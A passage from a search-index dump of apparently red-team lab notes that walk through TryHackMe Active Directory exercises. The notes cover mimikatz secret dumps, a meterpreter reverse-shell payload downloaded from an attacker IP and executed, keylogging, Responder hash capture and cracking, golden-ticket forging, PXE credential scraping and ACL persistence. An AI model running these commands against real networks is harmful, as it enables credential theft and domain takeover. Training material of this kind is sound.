Name...} CimSystemProperties : Microsoft.Management.Infrastructure.CimSystemProperties At system startup, the svcIIS account will auto-start a service which executes C:\\Windows\\system32.cmd.exe . That spawns a command prompt and causes the credential to be cached in memory. Dumping secrets with mimikatz  token::elevate - To dump the secrets from the registry hive, we need to impersonate the SYSTEM user. lsadump::secrets - Mimikatz interacts with the registry hive to pull the clear text credentials. PS C:\\Users\\t2_alan.riley> C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe .#####. mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## > https://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > https://pingcastle.com / https://mysmartlogon.com ***/ mimikatz # privilege::debug Privilege '20' OK mimikatz # token::elevate Token Id : 0 User name : SID name : NT AUTHORITY\\SYSTEM 488 {0;000003e7} 1 D 17781 NT AUTHORITY\\SYSTEM S-1-5-18 (04g,21p) Primary -> Impersonated ! * Process Token : {0;002e7dc8} 5 D 3496925 ZA\\t2_alan.riley S-1-5-21-3885271727-2693558621-2658995185-5243 (14g,24p) Primary * Thread Token : {0;000003e7} 1 D 3528379 NT AUTHORITY\\SYSTEM S-1-5-18 (04g,21p) Impersonation (Delegation) mimikatz # lsadump::secrets Domain : THMWRK1 SysKey : a1403e57976b472bce5f231922ca3942 Local name : THMWRK1 ( S-1-5-21-3226461851-763325627-4205969673 ) Domain name : ZA ( S-1-5-21-3885271727-2693558621-2658995185 ) Domain FQDN : za.tryhackme.loc Policy subsystem is : 1.18 LSA Key(s) : 1, default {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27} [00] {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27} 929bd1cdc726d31f5eea6fa5266a09521afd0be6309a08fd604c9a95c2af4463 Secret : $MACHINE.ACC cur/text: 0FFIKa\"c[#L6T>=.s*ZW'Gz04FL&7,\"VjxxhLeXqmI\\%Q%c..g?=olZZlnTA#J@;*8+&?neR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb%),mlWLo?6$kqP NTLM:4207d1b7e4b942da2371174b772fdf5e SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db old/text: 0FFIKa\"c[#L6T>=.s*ZW'Gz04FL&7,\"VjxxhLeXqmI\\%Q%c..g?=olZZlnTA#J@;*8+&?neR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb%),mlWLo?6$kqP NTLM:4207d1b7e4b942da2371174b772fdf5e SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db Secret : DefaultPassword old/text: vagrant Secret : DPAPI_SYSTEM cur/hex : 01 00 00 00 b6 54 c4 83 d9 88 10 f6 ee ae fc b7 ed 2d a2 d6 47 11 3f 8f 4a 6d 7f 72 35 b8 a2 93 3d 5c 5e 3f 03 8d 79 49 90 e7 2e e0 full: b654c483d98810f6eeaefcb7ed2da2d647113f8f4a6d7f7235b8a2933d5c5e3f038d794990e72ee0 m/u : b654c483d98810f6eeaefcb7ed2da2d647113f8f /...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "ce606a6171251c67154dde0b1168722e",
    "u": "https://ad.tymyrddin.dev/docs/pivot/setup",
    "t": "Setup for THM AD ",
    "c": "Setup for THM AD  Download the vpn config file from THM, and use it to configure sudo openvpn --config ./<username>-lateralmovementandpivoting.ovpn --daemon Check PID (you get a number, if not, doesn’t work): sudo ps aux | grep -v grep | grep -i <username>-lateralmovementandpivoting | awk -v FS=' ' '{print $2}' Set your DNS IPv4 to the IP address of the THMDC in the network diagram, and run: sudo systemctl restart NetworkManager Test: nslookup thmdc.za.tryhackme.com Go to http://distributor.za.tryhackme.com/creds and request your credentials for SSH access to thmjmp2 . Login with ssh : $ ssh username@za.tryhackme.com@thmjmp2.za.tryhackme.com",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "7a928cd69896bf5d1d529eb9df3d2fc7",
    "u": "https://ad.tymyrddin.dev/docs/harvest/laps",
    "t": "Local Administrator Password Solution ",
    "c": "Local Administrator Password Solution  GPP is a tool that allows administrators to create domain policies with embedded credentials. Once the GPP is deployed, different XML files are created in the SYSVOL folder. SYSVOL is an essential component of Active Directory and creates a shared directory on an NTFS volume that all authenticated domain users can access with reading permission. Once upon a time, the GPP relevant XML files contained a password encrypted using AES-256 bit encryption. At that time, the encryption was good enough until Microsoft somehow published its private key on MSDN . And because Domain users can read the content of the SYSVOL folder, it becomes easy to decrypt the stored passwords. One of the tools to crack the SYSVOL encrypted password is Get-GPPPassword . In 2015, Microsoft removed storing the encrypted password in the SYSVOL folder. It introduced the Local Administrator Password Solution (LAPS), which offers a much more secure approach to remotely managing the local administrator password. The new method includes two new attributes ( ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime ) of computer objects in the Active Directory. The ms-mcs-AdmPwd attribute contains a clear-text password of the local administrator, while the ms-mcs-AdmPwdExpirationTime contains the expiration time to reset the password. LAPS uses admpwd.dll to change the local administrator password and update the value of ms-mcs-AdmPwd . Enumerating for LAPS: Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Users\\thm>dir \"C:\\Program Files\\LAPS\\CSE\" Volume in drive C has no label. Volume Serial Number is A8A4-C362 Directory of C:\\Program Files\\LAPS\\CSE 06/06/2022 01:01 PM <DIR> . 06/06/2022 01:01 PM <DIR> .. 05/05/2021 07:04 AM 184,232 AdmPwd.dll 1 File(s) 184,232 bytes 2 Dir(s) 10,184,249,344 bytes free Switch: C:\\Users\\thm>powershell Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. Listing the available PowerShell cmdlets for LAPS: PS C:\\Users\\thm> Get-Command *AdmPwd* CommandType Name Version Source ----------- ---- ------- ------ Cmdlet Find-AdmPwdExtendedRights 5.0.0.0 AdmPwd.PS Cmdlet Get-AdmPwdPassword 5.0.0.0 AdmPwd.PS Cmdlet Reset-AdmPwdPassword 5.0.0.0 AdmPwd.PS Cmdlet Set-AdmPwdAuditing 5.0.0.0 AdmPwd.PS Cmdlet Set-AdmPwdComputerSelfPermission 5.0.0.0 AdmPwd.PS Cmdlet Set-AdmPwdReadPasswordPermission 5.0.0.0 AdmPwd.PS Cmdlet Set-AdmPwdResetPasswordPermission 5.0.0.0 AdmPwd.PS Cmdlet Update-AdmPwdADSchema 5.0.0.0 AdmPwd.PS Finding Users with AdmPwdExtendedRights Attribute: PS C:\\Users\\thm> Find-AdmPwdExtendedRights -Identity THMorg ObjectDN ExtendedRightHolders -------- -------------------- OU=THMorg,DC=thm,DC=red {THM\\LAPsReader} Finding Users belong to THMLAPsReader Group: PS C:\\Users\\thm> net groups \"LAPsReader\" Group name LAPsReader Comment Members ------------------------------------------------------------------------------- bk-admin The command completed successfully. Info: PS C:\\Users\\thm> net user bk-admin User name bk-admin Full Name THM Admin BK Comment User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 6/4/2022 10:33:48 AM Password expires Never Password changeable 6/5/2022 10:33:48 AM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 6/9/2022 3:47:28 PM Logon hours allowed All Local Group Memberships Global Group memberships *Domain Users *Domain Admins *LAPsReader *Enterprise Admins The command completed successfully. Switch to bk-admin : PS C:\\Users\\thm> runas /savecred /user:THM.red\\bk-admin cmd.exe Attempting to start cmd.exe as user \"THM.red\\bk-admin\" ... Enter the password for THM.red\\bk-admin: Attempting to start cmd.exe as user \"THM.red\\bk-admin\" ... PS C:\\Users\\thm> Get password: Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>powershell Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32> Get-AdmPwdPassword -ComputerName creds-harvestin ComputerName DistinguishedName Password ExpirationTimestamp ------------ ----------------- -------- ------------------- CREDS-HARVESTIN CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red THMLAPSPassw0rd 2/11/2338 11:05:2... PS C:\\Windows\\system32>",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "629c206db1ac1b6cf9a435dc8000dc6e",
    "u": "https://ad.tymyrddin.dev/docs/enum/cmd",
    "t": "Through Command Prompt ",
    "c": "Through Command Prompt  Run on a domain-joined host to enumerate domain users: net user /domain Run on a domain-joined host to get information about a specific domain user: net user user.name /domain Run on a domain-joined host to enumerate domain groups: net group /domain Run on a domain-joined host to get information about a specific domain group: net group groupName /domain Run on a domain-joined host to show the domain password and account lockout policy: net accounts /domain",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "0d74c40a23f2a3d60c8bf77be687ba09",
    "u": "https://ad.tymyrddin.dev/docs/exploit/users",
    "t": "Exploiting AD users ",
    "c": "Exploiting AD users  Users are, unfortunately, often the weakest link in the security chain. Just think about weak passwords and bad habits, such as granting overly permissive permissions. It would be ignorant and ineffective to overlook this attack surface: Credential Management - How users store their credentials. In AD, this is quite important since users may have multiple sets of credentials and remembering all of them can be a hassle. Keylogging - Often, during exploitation, we need to understand how normal users interact with a system. Together with screengrabs, keylogging can be a useful tool to gain this understanding from an attacker’s perspective. Using our WinRM shell from Kerberos delegation , we do some post-exploit enumeration and come across a .kdbx file in C:\\Users\\trevor.local\\Documents . It’s likely a password vault that’s been encrypted with a strong password. Payload  Generate a meterpreter payload: msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.50.57.175 LPORT=443 -f psh -o pwn.ps1 Start a listener: sudo msfconsole msf6> use exploit/multi/handler msf6> set payload windows/x64/meterpreter_reverse_tcp msf6> set LHOST kali-vpn-ip msf6> set LPORT 443 msf6> run Transfer the payload to the target  Start a Python web server on Kali: sudo python3 -m http.server 80 Download the file onto THMSERVER1 via the WinRM session and execute it: powershell.exe -ep bypass Create a web client object: $wc = New-Object Net.WebClient Download pwn.ps1 from Kali and save it in the current directory: $wc. DownloadFile('http://10.50.57.175/pwn.ps1', \"$PWD\\pwn.ps1\") .\\pwn.ps1 Start the keylogger meterpreter > keyscan_start Dump captured keystrokes meterpreter > keyscan_dump Stop the keylogger meterpreter > keyscan_stop Get flag  sudo apt install -y kpcli kpcli # Password is: Imreallysurenoonewillguessmypassword kpcli:/> open PasswordDatabase.kdbx kpcli:/> ls kpcli:/> ls PasswordDatabase/* kpcli:/> show -f -a PasswordDatabase/General/Flag THM{AD.Users.Can.Give.Up.Good.Secrets} kpcli:/> show -f -a PasswordDatabase/General/svcServMan Sup3rStr0ngPass!@",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "cb40493b1fc002ca3e0627ad1a0f26f8",
    "u": "https://ad.tymyrddin.dev/",
    "t": "Mythical blue lake ",
    "c": "Mythical blue lake  If an organisation’s grove uses Microsoft Windows, you are almost guaranteed to find AD. Microsoft AD is the dominant suite used to manage Windows domain networks. And because AD is used for Identity and Access Management of the entire grove, it holds the keys to the kingdom, making it a very likely target for attackers. Breaching Introduction NTLM authenticated services LDAP bind credentials Authentication relays Microsoft Deployment Toolkit Configuration files Enumerating Introduction Setup for THM AD Credential injection Through Microsoft Management Console Through Command Prompt Through PowerShell Through Bloodhound Cleanup Lateral movement and pivoting Introduction Setup for THM AD Moving through the network Spawning processes remotely Moving laterally using wmi Use of alternate authentication material Abusing user behaviour Port forwarding Cleanup Exploiting Introduction Setup for THM AD Exploiting permission delegation Exploiting kerberos delegation Exploiting automated relays Exploiting AD users Exploiting GPOs Exploiting certificates Exploiting domain trusts Persisting Introduction Setup for THM AD Persistence through credentials Persistence through tickets Persistence through certificates Persistence through SID history Persistence through group membership Persistence through ACLs Persistence through GPOs Credentials harvesting Introduction Credential access Local Windows credentials Local Security Authority Subsystem Service Windows Credential Manager Domain Controller Local Administrator Password Solution Hashes and tickets",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "bb9c45c228e7f478e7987c9ee2f05fa1",
    "u": "https://ad.tymyrddin.dev/docs/persist/setup",
    "t": "Setup for THM AD ",
    "c": "Setup for THM AD  Connecting to the network  Download the vpn config file from THM, and use it to configure sudo openvpn --config ./<some assigned code>-persistingad.ovpn --daemon Check PID (you get a number, if not, does not work): sudo ps aux | grep -v grep | grep -i <some assigned code>-persistingad.ovpn | awk -v FS=' ' '{print $2}' Edit DNS configuration  Set your DNS IPv4 to the IP address of the THMCHILDDC in the network diagram (also add 1.1.1.1 for connections to the internet) and run: sudo systemctl restart NetworkManager Test hostname lookups  $ dig thmdc.za.tryhackme.loc ; <<>> DiG 9.18.7-1-Debian <<>> thmdc.za.tryhackme.loc ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 468 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4000 ;; QUESTION SECTION: ;thmdc.za.tryhackme.loc. IN A ;; ANSWER SECTION: thmdc.za.tryhackme.loc. 1200 IN A 10.200.60.101 ;; Query time: 40 msec ;; SERVER: 10.200.60.101#53(10.200.60.101) (UDP) ;; WHEN: Mon Nov 07 14:15:34 GMT 2022 ;; MSG SIZE rcvd: 67 And: $ nslookup google.com ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out Server: 1.1.1.1 Address: 1.1.1.1#53 Non-authoritative answer: Name: google.com Address: 216.58.214.78 ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out Name: google.com Address: 2a00:1450:4007:818::200e Request credentials  Get your credentials from http://distributor.za.tryhackme.loc/creds . Jump in  You can now either login with ssh , for example: $ ssh za.tryhackme.loc\\\\<AD Username>@thmwrk1.za.tryhackme.loc Or by RDP: $ xfreerdp /v:thmwrk1.za.tryhackme.loc /u:'<AD Username>' /p:'<AD Password>'",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "f9020acb7943bcc7fc068fb8d2a10965",
    "u": "https://ad.tymyrddin.dev/docs/breach/relays",
    "t": "Authentication relays ",
    "c": "Authentication relays  In Windows networks, there are a significant amount of services talking to each other, allowing users to make use of the services provided by the network. These services use built-in authentication methods to verify the identity of incoming connections, such as NTLM Authentication used on a web application. This is a dive into NetNTLM authentication used by SMB. Download the password list to be used for cracking the NetNTLM hash. Server Message Block  Used by Windows (and Linux) systems to facilitate file sharing, remote administration, etc. Newer versions of the SMB protocol resolve some vulnerabilities, but companies with legacy systems continue to use older versions. SMB communications are not encrypted and can be intercepted. LLMNR, NBT-NS, and WPAD  NBT-NS and LLMNR are ways to resolve hostnames to IP addresses on the LAN. WPAD is a way for Windows hosts to auto-discover web proxies. These protocols are broadcast on the LAN and can therefore be poisoned, tricking hosts into thinking they’re talking with the intended target. Since these are layer 2 protocols, any time we use Responder to capture and poison requests, we must be on the same LAN as the target. Intercepting NetNTLM challenge  Edit the Responder configuration file and make sure the SMB and HTTP servers are set to On : sudo nano /etc/responder/Responder.conf [Responder Core] ; Servers to start SQL = Off SMB = On RDP = Off Kerberos = On FTP = On POP = Off SMTP = Off IMAP = Off HTTP = On HTTPS = Off DNS = Off LDAP = On DCERPC = Off WINRM = Off Run Responder and wait for the client to connect (A simulated host runs every 30 minutes): sudo responder -I tun0 Crack the hash: echo 'svcFileCopy::ZA:7cc90fae8c5d340dhash john --wordlist=./passwordlist.txt hash",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "68e005fbe33646a25d21d2a3f00dfa93",
    "u": "https://ad.tymyrddin.dev/docs/persist/readme",
    "t": "Introduction ",
    "c": "Introduction  THM Room: Persisting Active Directory What?  Common Active Directory persistence techniques. Why?  To ensure the blue team will not be able to kick us out during a red team exercise. How?  Setup for THM AD Persistence through credentials Persistence through tickets Persistence through certificates Persistence through SID history Persistence through group membership Persistence through ACLs Persistence through GPOs",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "feb315577473173cbba9c06cff96561b",
    "u": "https://ad.tymyrddin.dev/docs/persist/tickets",
    "t": "Persistence through tickets ",
    "c": "Persistence through tickets  Kerberos authentication flow  Ticket Granting Ticket: As long as the session has not lapsed, the user can reuse the TGT as often as needed to request a TGS. Ticket Granting Service: The TGS also has a service session key, and when the SP decrypts the ticket, the SP will have a session key for the user. User Authentication: Deny/Allow Pass-the-Ticket requires both the ticket and the service session key in order to pass a TGS to a service principal to authenticate as a user. A TGT (Golden ticket) allows an attacker to request multiple TGSs (Silver tickets) on behalf of a user. When a user requests a TGS, they send an encrypted timestamp derived from their password. The algorithm used to create this key can be DES (disabled by default on newer Windows installations), RC4 , AES218 , or AES256 , and can perhaps be extracted using mimikatz . If any of these keys are available on the host, then we can try to request a TGT as the user the Pass-the-Key way. The RC4 hash is equal to a user’s NTLM hash. If a users’ NTLM hashes were dumped from LSASS during enumeration on a domain-joined host, and RC4 a valid encryption algorithm, then these are RC4 hashes, which could be used to request a TGT the Overpass-the-Hash way. Golden Tickets  Golden Tickets are forged TGTs. What this means is we bypass steps 1 and 2 of the diagram above, where we prove to the DC who we are. Having a valid TGT of a privileged account, we can now request a TGS for almost any service we want. In order to forge a golden ticket, we need the krbtg account’s password hash so that we can sign a TGT for any user account we want. Some interesting notes about Golden Tickets: By injecting at this stage of the Kerberos process, we don’t need the password hash of the account we want to impersonate since we bypass that step. The TGT is only used to prove that the KDC on a DC signed it. Since it was signed by the krbtg hash, this verification passes and the TGT is declared valid no matter its contents. Speaking of contents, the KDC will only validate the user account specified in the TGT if it is older than 20 minutes. This means we can put a disabled, deleted, or non-existent account in the TGT, and it will be valid as long as we ensure the timestamp is not older than 20 minutes. Since the policies and rules for tickets are set in the TGT itself, we could overwrite the values pushed by the KDC, such as, for example, that tickets should only be valid for 10 hours. We could, for instance, ensure that our TGT is valid for 10 years, granting us persistence. By default, the krbtg account’s password never changes, meaning once we have it, unless it is manually rotated, we have persistent access by generating TGTs forever. The blue team would have to rotate the krbtg account’s password twice, since the current and previous passwords are kept valid for the account. This is to ensure that accidental rotation of the password does not impact services. Rotating the krbtg account’s password is an incredibly painful process for the blue team since it will cause a significant amount of services in the environment to stop working. They think they have a valid TGT, sometimes for the next couple of hours, but that TGT is no longer valid. Not all services are smart enough to release the TGT is no longer valid (since the timestamp is still valid) and thus won’t auto-request a new TGT. Golden tickets would even allow you to bypass smart card authentication, since the smart card is verified by the DC before it creates the TGT. We can generate a golden ticket on any machine, even one that is not domain-joined (such as our own attack machine), making it harder for the blue team to detect. Apart from the krbtg account’s password hash, we only need the domain name, domain SID, and user ID for the person we want to impersonate. If we are in a position where we can recover the krbtg account’s password hash, we would already be in a position where we can recover the other pieces of the required information. Silver Tickets  Silver Tickets are forged TGS tickets. So now, we skip all communication (Step 1-4 in the diagram above) we would have had with the KDC on the DC and just interface with the service we want access to directly. Some interesting notes about Silver Tickets: The generated TGS is signed by the machine account of the host we are targeting. The main difference between Golden and Silver Tickets is the number of privileges we acquire. If we have the krbtg account’s password hash, we can get access to everything. With a Silver Ticket, since we only have access to the password hash of the machine account of the server we are attacking, we can only impersonate users on that host itself. The Silver Ticket’s scope is limited to whatever service is targeted on the specific server. Since the TGS is forged, there is no associated TGT, meaning the DC was never contacted. This makes the attack incredibly dangerous since the only available logs would be on the targeted server. So while the scope is more limited, it is significantly harder for the blue team to detect. Since permissions are determined through SIDs, we can again create a non-existing user for our silver ticket, as long as we ensure the ticket has the relevant SIDs that would place the user in the host’s local administrators group. The machine account’s password is usually rotated every 30 days, which would not be good for persistence. However, we could leverage the access our TGS provides to gain access to the host’s registry and alter the parameter that is responsible for the password rotation of the machine account. Thereby ensuring the machine account remains static and granting us persistence on the machine. While only having access to a single host might seem like a significant downgrade, machine accounts can be used as normal AD accounts, allowing you not only administrative access to the host but also the means to continue enumerating and exploiting AD as you would with an AD user account. Forging tickets  SSH to THMWRK1 with the unprivileged user account from the distributor. ssh user.name@za.tryhackme.loc@thmwrk1.za.tryhackme.loc Start a powershell: powershell.exe -ep bypass Get the domain context: PS C:\\Users\\Administrator.ZA> Get-ADDomain AllowedDNSSuffixes : {} ComputersContainer : CN=Computers,DC=za,DC=tryhackme,DC=loc DeletedObjectsContainer : CN=Deleted Objects,DC=za,DC=tryhackme,DC=loc DistinguishedName : DC=za,DC=tryhackme,DC=loc DNSRoot : za.tryhackme.loc DomainControllersContainer : OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc DomainMode : Windows2012R2Domain DomainSID : S-1-5-21-3885271727-2693558621-2658995185 ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=za,DC=tryhackme,DC=loc Forest : tryhackme.loc InfrastructureMaster : THMDC.za.tryhackme.loc LastLogonReplicationInterval : LinkedGroupPolicyObjects : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=za,DC=tryhackme,DC=loc} LostAndFoundContainer : CN=LostAndFound,DC=za,DC=tryhackme,DC=loc ManagedBy : Name : za NetBIOSName : ZA ObjectClass : domainDNS ObjectGUID : 1fc9e299-da51-4d03-baa0-862c3360c0b2 ParentDomain : tryhackme.loc PDCEmulator : THMDC.za.tryhackme.loc PublicKeyRequiredPasswordRolling : QuotasContainer : CN=NTDS Quotas,DC=za,DC=tryhackme,DC=loc ReadOnlyReplicaDirectoryServers : {} ReplicaDirectoryServers : {THMDC.za.tryhackme.loc} RIDMaster : THMDC.za.tryhackme.loc SubordinateReferences : {DC=DomainDnsZones,DC=za,DC=tryhackme,DC=loc} SystemsContainer : CN=System,DC=za,DC=tryhackme,DC=loc UsersContainer : CN=Users,DC=za,DC=tryhackme,DC=loc Start Mimikatz: PS C:\\Users\\Administrator.ZA> C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe Forge a golden ticket: mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt We can specify /admin:ReallyNotLegitAccount...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "8239fe7cc428a764d7a64693a8826c23",
    "u": "https://ad.tymyrddin.dev/docs/enum/cleanup",
    "t": "Cleanup ",
    "c": "Cleanup  Remove the sharphound zip and directory. Close bloodhound. Stop neo4j: neo4j stop To stop the vpn daemon started in setup , get PID: sudo ps aux | grep -v grep | grep -i <username>-adenumeration.ovpn | awk -v FS=' ' '{print $2}' <PID> and kill the process: sudo kill -9 <PID> Remove the IP address of the THMDC in DNS IPv4 setting and run: sudo systemctl restart NetworkManager Done.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "96abb3df713940a6a67acbc0985ffd9e",
    "u": "https://ad.tymyrddin.dev/docs/enum/bloodhound",
    "t": "Through Bloodhound ",
    "c": "Through Bloodhound  Bloodhound runs locally on an attacker’s machine. The attacker must run a “collector” like sharphound on the target to enumerate domain information. After the collector finishes running, it will output a series of .json files for import into the Bloodhound interface. On the attack machine: mkdir sharphound cd sharphound wget https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip --2022-10-12 14:20:23-- https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip ... HTTP request sent, awaiting response... 200 OK Length: 2138953 (2.0M) [application/octet-stream] Saving to: ‘SharpHound-v1.1.0.zip’ SharpHound-v1.1.0.z 100%[===================>] 2.04M 1.91MB/s in 1.1s 2022-10-12 14:20:35 (1.91 MB/s) - ‘SharpHound-v1.1.0.zip’ saved [2138953/2138953] Start a server to serve it: python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Now ssh into target machine using the credentials given: ssh kenneth.davies@za.tryhackme.com@thmjmp1.za.tryhackme.com In the target machine terminal, switch to powershell: za\\kenneth.davies@THMJMP1 C:\\Users\\kenneth.davies\\Documents>powershell Choose a directory to work from (I used Documents , and download the SharpHound-v1.1.0.zip from the http server on the attack machine: PS C:\\Users\\kenneth.davies\\Documents> Invoke-WebRequest http://10.50.16.168/SharpHound-v1.1.0.zip -OutFile SharpHound-v1.1.0.zip Extract: PS C:\\Users\\kenneth.davies\\Documents> Expand-Archive SharpHound-v1.1.0.zip Enumerate: PS C:\\Users\\kenneth.davies\\Documents> cd SharpHound-v1.1.0 PS C:\\Users\\kenneth.davies\\Documents\\SharpHound-v1.1.0> .\\SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs 2022-10-12T14:49:52.7476245+01:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound ... 2022-10-12T14:50:42.7872718+01:00|INFORMATION|SharpHound Enumeration Completed at 2:50 PM on 10/12/2022! Happy Graphing! Get name of results: PS C:\\Users\\kenneth.davies\\Documents\\SharpHound-v1.1.0> dir Directory: C:\\Users\\kenneth.davies\\Documents\\SharpHound-v1.1.0 Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 10/12/2022 2:50 PM 139831 20221012145038_BloodHound.zip ... On the attack machine, use ssh to copy the bloodhound results over: scp kenneth.davies@za.tryhackme.com@thmjmp1.za.tryhackme.com:C:/Users/kenneth.davies/Documents/SharpHound-v1.1.0/20221012145038_BloodHound.zip . Fire up neo4j and bloodhound : sudo neo4j start bloodhound & Drop the copied over results in the bloodhound window, and play around with options. Start playing around and answer the questions. Use Search for a node... to find specific users, groups, etc. Click on specific properties of an object to visualise it Use the Analysis tab to run built-in queries …",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "6d7e57e9e8e0f823a495f6ef00c405ef",
    "u": "https://ad.tymyrddin.dev/docs/breach/mdt",
    "t": "Microsoft Deployment Toolkit ",
    "c": "Microsoft Deployment Toolkit  Large organisations need tools to deploy and manage the infrastructure of the estate. In massive organisations, you can’t have your IT personnel running around with DVDs or USB Flash for installing software on every single machine. Microsoft Deployment Toolkit (MDT) is used to deploy operating systems over the network using PXE boot; SCCM is used to manage hosts after they’ve been provisioned. Both of these technologies have the advantage of being a centralised management system for hosts. And, they also represent a massive attack surface. If an attacker can pretend to be a PXE booting client on the network and request an image from MDT via a DHCP request, then the attacker could inject or scrape information from the PXE image during and after the setup process. SSH into the jump host with password Password1@ : ssh thm@THMJMP1.za.tryhackme.com Create a working directory for the session using your username and copy the powerpxe directory into it: powershell -ep bypass mkdir Barzh cd Barzh cp -Recurse C:\\powerpxe . Go to http://pxeboot.za.tryhackme.com/ Pretend to be a PXE client sending a DHCP request and receiving a list of BCD files for configuration. Copy the file name. Use TFTP to connect to the MDT server and retrieve the BCD file and scrape it for credentials: tftp -i (Resolve-DnsName thmmdt.za.tryhackme.com).IPAddress GET \"\\Tmp\\x64{BFA810B9-DF7D-401C-B5B6-2F4D37258344}.bcd\" conf.bcd Now have downloaded the BCD file and copied the powerpxe folder. Get the location of the WIM file, the Windows bootable image. Import-Module .\\powerpxe\\PowerPXE.ps1 $bcdfile = \"conf.bcd\" Get-WimFile -bcdFile $bcdfile >> Parse the BCD file: conf.bcd >>>> Identify wim file : \\Boot\\x64\\Images\\LiteTouchPE_x64.wim \\Boot\\x64\\Images\\LiteTouchPE_x64.wim We know the path to download the image: $wimfile = '\\Boot\\x64\\Images\\LiteTouchPE_x64.wim' $mdtserver = (Resolve-DnsName thmmdt.za.tryhackme.com).IPAddress tftp -i $mdtserver GEt \"$wimfile\" pxeboot.wim Transfer successful: 341899611 bytes in 277 second(s), 1234294 bytes/s Scrape the image for credentials: Get-FindCredentials -WimFile .\\pxeboot.wim >>>> Finding Bootstrap.ini >>>> >>>> DeployRoot = \\\\THMMDT\\MTDBuildLab$ >>>> >>>> UserID = svcMDT >>>> >>>> UserDomain = ZA >>>> >>>> UserPassword = PXEBootSecure1@",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "d9ce460772bcbe2e0da49eaae42665ff",
    "u": "https://ad.tymyrddin.dev/docs/persist/acls",
    "t": "Persistence through ACLs ",
    "c": "Persistence through ACLs  Active Directory has a process called SDProp that replicates a template called AdminSDHolder to all protected groups in the domain. If an attacker adds their user account to the AdminSDHolder template, SDProp will replicate the ACL to all the protected groups when it runs every 60 minutes. So even if the attacker is removed from privileged groups, they will be re-added at very cycle by SDProp . RDP to thmwrk1 with the unprivileged user account: xfreerdp /v:thmwrk1.za.tryhackme.loc /u:'user.name' /p:'Password' Inject the network credentials of the domain administrator into a session: runas /netonly /user:za.tryhackme.loc\\Administrator cmd.exe Modify the AdminSDHolder template  From the command prompt running with the injected domain admin credential, run mmc.exe . Go to File -> Add/Remove Snap-in Add the Active Directory Users and Computers snap-in. Add the unprivileged user to the ACL here and allow Full Control for the user. Manually start the SDProp sync procedure. WinRM to the Domain Controller  In the injected session, enter a PowerShell session: powershell -ep bypass WinRM to the domain controller as the DA: Enter-PSSession -ComputerName thmdc.za.tryhackme.loc Now running a PowerShell session on the domain controller: Import-Module C:\\Tools\\Invoke-ADSDPropagation.ps1 Invoke-ADSDPropagation",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "95e32a08fb46c6f4e89881a63a177cd6",
    "u": "https://ad.tymyrddin.dev/docs/exploit/gpos",
    "t": "Exploiting GPOs ",
